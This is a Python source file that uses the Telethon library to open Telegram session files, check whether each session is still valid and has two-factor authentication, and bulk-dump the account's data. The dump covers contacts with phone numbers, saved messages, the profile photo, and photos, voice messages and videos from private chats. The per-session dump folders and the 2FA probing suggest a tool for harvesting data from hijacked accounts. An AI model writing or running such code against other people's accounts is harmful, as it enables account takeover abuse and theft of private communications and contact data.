import os, datetime
from telethon import TelegramClient, functions

from app.credentials import TelegramCredentials


class SessionManager:

	async def inject(self):
		self.client = TelegramClient(
			self.put,
			**TelegramCredentials.client_kwargs()
		)
		await self.client.connect()
		return self.client


	async def is_valid(self) -> bool:	
		try:
			await self.inject()
			if not await self.client.get_me():
				return False
		except:
			return False
		return True


	async def get_2fa(self):
		try:
			result = await self.client(functions.account.GetPasswordRequest())
			if result.has_password:
				return True
			return False
		except:
			return None


	async def start_dump(self, name_session):
		self.name_session = name_session

		self.dump_folder = f"dumps/{name_session}"
		self.dump_photo_folder = f"dumps/{name_session}/photos"
		self.dump_voice_messages_folder = f"dumps/{name_session}/voice_messages"
		self.dump_videos_folder = f"dumps/{name_session}/videos"

		self.dump_contacts_file = f"dumps/{name_session}/contacts.txt"
		self.dump_saved_messages_file = f"dumps/{name_session}/saved_messages.txt"
		self.dump_info_file = f"dumps/{name_session}/info.txt"
		self.dump_ava = f"dumps/{name_session}/ava.png"
		self.dump_date = str(datetime.datetime.now()).split(".")[0]
		return await self.dump_process()


	async def dump_process(self):
		self.count_user_dialogs = 0
		self.count_all_dialogs = 0
		self.count_photos = 0

		await self.create_folders()
		await self.dump_contacts()
		await self.dump_dialogs()
		await self.dump_info()
		return True


	async def create_folders(self):
		os.mkdir(self.dump_folder)
		if self.config.dump_photo: os.mkdir(self.dump_photo_folder)
		if self.config.dump_voice_message: os.mkdir(self.dump_voice_messages_folder)
		if self.config.dump_video: os.mkdir(self.dump_videos_folder)


	async def dump_dialogs(self):
		async for dialog in self.client.iter_dialogs():
			self.count_all_dialogs += 1
			if dialog.is_user: 
				if not dialog.entity.bot:
					await self.dump_dialog(dialog)


	async def dump_dialog(self, dialog):
		self.count_user_dialogs += 1
		process = self.config.dump_photo or self.config.dump_video or self.config.dump_voice_message
		if not process: return 
		async for message in self.client.iter_messages(dialog.entity.id):
			try:
				if message.photo and self.config.dump_photo:
					await message.download_media(self.dump_photo_folder)
					self.count_photos += 1

				if message.document:
					if message.document.mime_type  == "audio/ogg" and self.config.dump_voice_message:
						await message.download_media(self.dump_voice_messages_folder)
					elif message.document.mime_type == "video/mp4" and message.document.size / 1000 / 1000 < self.config.dump_max_size_video and self.config.dump_video:
						await message.download_media(self.dump_videos_folder)
			except:
				pass
			


	async def dump_contacts(self):
		contacts = await self.client(functions.contacts.GetContactsRequest(hash=0))
		self.count_contacts = len(contacts.users)
		info = list()
		for user in contacts.users:
			text = [
				f"Telegram User ID: {user.id}",
				f"Telegram Username: @{user.username}",
				f"Account Name: {user.first_name} {user.last_name}",
				f"Phone Number: {user.phone}",
				f"Premium Status: {user.premium}",
				f"Scam Status: {user.scam}\n",
			]
			info.append(text)

		with open(self.dump_contacts_file, "w+", encoding="utf-8") as file:
			text = [
				f"Date of Dump: {self.dump_date}",
				f"Number of Telegram Contacts: {self.count_contacts}\n",
			]
			for i in info:
				text += i
			file.write('\n'.join(text))


	async def dump_info(self):
		user = await self.client.get_me()
		text = [
			f"Date of Dump: {self.dump_date}\n",
			f"Telegram User ID: {user.id}",
			f"Telegram Username: @{user.username}",
			f"Account Name: {user.first_name} {user.last_name}",
			f"Phone Number: {user.phone}",
			f"Premium Status: {user.premium}",
			f"Scam Status: {user.scam}",
			f"Exists 2FA: {await self.get_2fa()}\n",
			f"Total Number of Dialogues: {self.count_all_dialogs}",
			f"Number of Dialogues with Users: {self.count_user_dialogs}",
			f"Photos Downloaded: {self.count_photos}",
			f"Number of Telegram Contacts: {self.count_contacts}"
		]
		with open(self.dump_info_file, "w+", encoding="utf-8") as file:
			file.write('\n'.join(text))

		messages = list()
		async for message in self.client.iter_messages("me"):
			try:
				if message.text:
					messages.append(message.text)
			except:
				continue

		with open(self.dump_saved_messages_file, "w+", encoding="utf-8") as file:
			file.write('\n\n'.join(messages))

		try:
			await self.client.download_profile_photo("me", self.dump_ava)
		except:
			pass


		


	def __init__(self, put, config):
		self.put = put
		self.config = config